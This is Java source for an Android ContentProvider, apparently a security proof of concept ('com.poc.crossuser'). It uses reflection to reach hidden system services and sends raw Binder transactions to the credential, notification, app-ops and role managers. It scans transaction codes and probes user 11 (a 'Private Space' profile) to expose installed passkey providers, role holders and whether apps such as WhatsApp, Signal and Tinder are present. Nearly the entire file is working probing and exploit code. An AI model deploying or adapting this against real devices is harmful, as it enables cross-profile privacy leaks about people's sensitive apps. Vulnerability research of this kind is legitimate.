package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class CredNotiProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("credential")) {
            probeCredentialManager(cursor);
        } else if (path != null && path.contains("notification")) {
            probeNotificationManager(cursor);
        } else if (path != null && path.contains("appops")) {
            probeAppOps(cursor);
        } else if (path != null && path.contains("role")) {
            probeRoleManager(cursor);
        } else {
            probeCredentialManager(cursor);
            probeNotificationManager(cursor);
            probeAppOps(cursor);
            probeRoleManager(cursor);
        }

        return cursor;
    }

    private void probeCredentialManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("credential");
        if (binder == null) { cursor.addRow(new Object[]{"credential", "no_binder"}); return; }
        String desc = "android.credentials.ICredentialManager";

        // TX=10: getCredentialProviderServices — reveals installed credential/passkey providers
        // TX=12: isServiceEnabled
        // TX=9: isEnabledCredentialProviderService

        // TX=12: isServiceEnabled()
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                binder.transact(12, data, reply, 0);
                reply.readException();
                int val = reply.readInt();
                cursor.addRow(new Object[]{"cred_isEnabled", "val=" + val});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"cred_isEnabled", "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cred_isEnabled", "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=10: getCredentialProviderServices(userId, providerFilter)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0); // providerFilter (0 = all?)
                binder.transact(10, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                if (avail > 4) {
                    int pos = reply.dataPosition();
                    StringBuilder raw = new StringBuilder("avail=" + avail + " raw=[");
                    int maxInts = Math.min(avail / 4, 15);
                    for (int i = 0; i < maxInts; i++) {
                        if (reply.dataAvail() >= 4) {
                            int v = reply.readInt();
                            raw.append(String.format("0x%X", v));
                            if (i < maxInts - 1) raw.append(",");
                        }
                    }
                    raw.append("]");
                    cursor.addRow(new Object[]{"cred_providers_u" + userId, raw.toString()});
                } else {
                    cursor.addRow(new Object[]{"cred_providers_u" + userId, "avail=" + avail});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"cred_providers_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cred_providers_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=9: isEnabledCredentialProviderService(ComponentName, userId)
        String[] providerComponents = {
            "com.google.android.gms/.auth.api.credentials.CredentialProviderService",
            "com.google.android.gms/.fido.credman.CredManFidoProviderService",
            "com.android.settings/.applications.credentials.DefaultCombinedPicker",
        };
        for (String comp : providerComponents) {
            for (int userId : new int[]{0, 11}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    // ComponentName parcelable: writeString(pkg) + writeString(cls)
                    String[] parts = comp.split("/");
                    String pkg = parts[0];
                    String cls = parts[1].startsWith(".") ? pkg + parts[1] : parts[1];
                    data.writeInt(1); // non-null marker for ComponentName
                    data.writeString(pkg);
                    data.writeString(cls);
                    data.writeInt(userId);
                    binder.transact(9, data, reply, 0);
                    reply.readException();
                    int result = reply.readInt();
                    cursor.addRow(new Object[]{"cred_enabled_" + shortComp(comp) + "_u" + userId,
                        "result=" + result + (result != 0 ? " ENABLED!" : " disabled")});
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"cred_enabled_" + shortComp(comp) + "_u" + userId,
                        "DENIED:" + truncate(e.getMessage())});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"cred_enabled_" + shortComp(comp) + "_u" + userId,
                        "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void probeNotificationManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("notification");
        if (binder == null) { cursor.addRow(new Object[]{"notification", "no_binder"}); return; }
        String desc = "android.app.INotificationManager";

        // Key methods for cross-user probing:
        // areNotificationsEnabledForPackage(pkg, uid) — check specific apps' notification state
        // getActiveNotifications(callingPkg) — get own active notifications
        // getNotificationHistory — get notification history

        // Try broad TX scan for accessible methods
        int[] interestingTx = {1, 2, 3, 4, 5, 10, 15, 20, 25, 30, 35, 40, 50, 60, 70, 80, 90, 100};
        for (int tx : interestingTx) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0); // userId or other param
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"noti_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"noti_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 5 && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"noti_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // areNotificationsEnabledForPackage - try to check other packages' notification state
        // This could reveal if apps are installed
        String[] targetPkgs = {
            "com.whatsapp",
            "org.thoughtcrime.securesms",
            "com.tinder",
            "com.google.android.apps.messaging",
        };
        for (String pkg : targetPkgs) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(10000); // fake uid
                binder.transact(12, data, reply, 0); // areNotificationsEnabledForPackage
                reply.readException();
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"noti_enabled_" + shortPkg(pkg),
                    "result=" + enabled + (enabled != 0 ? " YES" : " NO")});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"noti_enabled_" + shortPkg(pkg), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"noti_enabled_" + shortPkg(pkg), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeAppOps(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("appops");
        if (binder == null) { cursor.addRow(new Object[]{"appops", "no_binder"}); return; }
        String desc = "com.android.internal.app.IAppOpsService";

        // IAppOpsService interesting methods:
        // checkOperation(code, uid, packageName) — check if an operation is allowed for an app
        // noteOperation — note that an operation was performed
        // getOpsForPackage(uid, packageName, ops) — get ops state for a package

        // OP codes of interest:
        // 26 = OP_CAMERA, 27 = OP_RECORD_AUDIO, 1 = OP_FINE_LOCATION
        // 76 = OP_REQUEST_INSTALL_PACKAGES, 24 = OP_READ_CALL_LOG

        // checkOperation for various ops on various UIDs
        int[] ops = {0, 1, 2, 24, 26, 27, 76};
        // Try checking for well-known package UIDs
        // GMS is typically uid 10XXX where XXX depends on install order
        // Instead of guessing UIDs, try with our own first
        int myUid = android.os.Process.myUid();

        for (int op : ops) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(op);
                data.writeInt(myUid);
                data.writeString(getContext().getPackageName());
                binder.transact(1, data, reply, 0); // checkOperation
                reply.readException();
                int result = reply.readInt();
                cursor.addRow(new Object[]{"appops_check_op" + op, "mode=" + result});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"appops_check_op" + op, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Try getPackagesForOps — this lists packages that have had ops noted
        // Could reveal installed apps even those not normally visible
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // writeIntArray format: length + values
            int[] queryOps = {26, 27, 1}; // camera, mic, location
            data.writeInt(queryOps.length);
            for (int op : queryOps) data.writeInt(op);
            binder.transact(4, data, reply, 0); // getPackagesForOps
            reply.readException();
            int avail = reply.dataAvail();
            if (avail > 4) {
                int count = reply.readInt();
                cursor.addRow(new Object[]{"appops_pkgsForOps", "count=" + count + " avail=" + avail});
                // Try to read PackageOps parcelables
                for (int i = 0; i < Math.min(count, 5); i++) {
                    try {
                        int marker = reply.readInt();
                        if (marker != 0) {
                            String pkg = reply.readString();
                            int uid = reply.readInt();
                            cursor.addRow(new Object[]{"appops_pkg" + i, pkg + " uid=" + uid});
                            // Skip OpEntry list
                            int opCount = reply.readInt();
                            for (int j = 0; j < opCount; j++) {
                                reply.readInt(); // op
                                reply.readInt(); // mode
                                // skip remaining OpEntry fields...
                                break; // just get pkg name for now
                            }
                        }
                    } catch (Exception e) {
                        cursor.addRow(new Object[]{"appops_pkg" + i, "parse_err:" + truncate(e.getMessage())});
                        break;
                    }
                }
            } else {
                cursor.addRow(new Object[]{"appops_pkgsForOps", "avail=" + avail});
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"appops_pkgsForOps", "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"appops_pkgsForOps", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeRoleManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("role");
        if (binder == null) { cursor.addRow(new Object[]{"role", "no_binder"}); return; }
        String desc = "android.app.role.IRoleManager";

        // IRoleManager interesting methods:
        // getRoleHolders(roleName, userId) — reveals which apps hold specific roles
        // Roles like "android.app.role.BROWSER", "android.app.role.SMS", "android.app.role.DIALER"
        // These reveal installed apps without QUERY_ALL_PACKAGES

        String[] roles = {
            "android.app.role.BROWSER",
            "android.app.role.SMS",
            "android.app.role.DIALER",
            "android.app.role.HOME",
            "android.app.role.ASSISTANT",
            "android.app.role.EMERGENCY",
            "android.app.role.CALL_SCREENING",
            "android.app.role.CALL_COMPANION",
            "android.app.role.SYSTEM_GALLERY",
            "android.app.role.NOTES",
        };

        // TX scan to find getRoleHolders
        // Typically: getRoleHoldersAsUser(roleName, userId) is TX=2 or similar
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString("android.app.role.BROWSER");
                data.writeInt(0); // userId
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            int pos = reply.dataPosition();
                            // Try reading as string list
                            int count = reply.readInt();
                            if (count >= 0 && count < 100) {
                                StringBuilder sb = new StringBuilder("count=" + count + " [");
                                for (int i = 0; i < Math.min(count, 5); i++) {
                                    String s = reply.readString();
                                    sb.append(s);
                                    if (i < count - 1) sb.append(",");
                                }
                                sb.append("]");
                                cursor.addRow(new Object[]{"role_tx" + tx, sb.toString()});
                            } else {
                                reply.setDataPosition(pos);
                                cursor.addRow(new Object[]{"role_tx" + tx, "avail=" + avail + " first=" + reply.readInt()});
                            }
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"role_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 5 && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"role_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }

        // Once we identify getRoleHolders TX, query for user 11 (Private Space)
        // For now, try TX=2 with various roles for user 11
        for (String role : roles) {
            for (int userId : new int[]{0, 11}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(role);
                    data.writeInt(userId);
                    binder.transact(2, data, reply, 0);
                    reply.readException();
                    int avail = reply.dataAvail();
                    if (avail > 4) {
                        int count = reply.readInt();
                        if (count > 0 && count < 100) {
                            StringBuilder sb = new StringBuilder("[");
                            for (int i = 0; i < Math.min(count, 5); i++) {
                                String s = reply.readString();
                                sb.append(s);
                                if (i < count - 1) sb.append(",");
                            }
                            sb.append("]");
                            String roleName = role.substring(role.lastIndexOf('.') + 1);
                            cursor.addRow(new Object[]{"role_" + roleName + "_u" + userId, sb.toString()});
                        }
                    }
                } catch (SecurityException e) {
                    String roleName = role.substring(role.lastIndexOf('.') + 1);
                    cursor.addRow(new Object[]{"role_" + roleName + "_u" + userId,
                        "DENIED:" + truncate(e.getMessage())});
                } catch (Exception e) {
                    // skip noise
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private String shortPkg(String pkg) {
        String[] parts = pkg.split("\\.");
        return parts[parts.length - 1];
    }

    private String shortComp(String comp) {
        String[] parts = comp.split("/");
        String cls = parts[1];
        return cls.substring(cls.lastIndexOf('.') + 1);
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
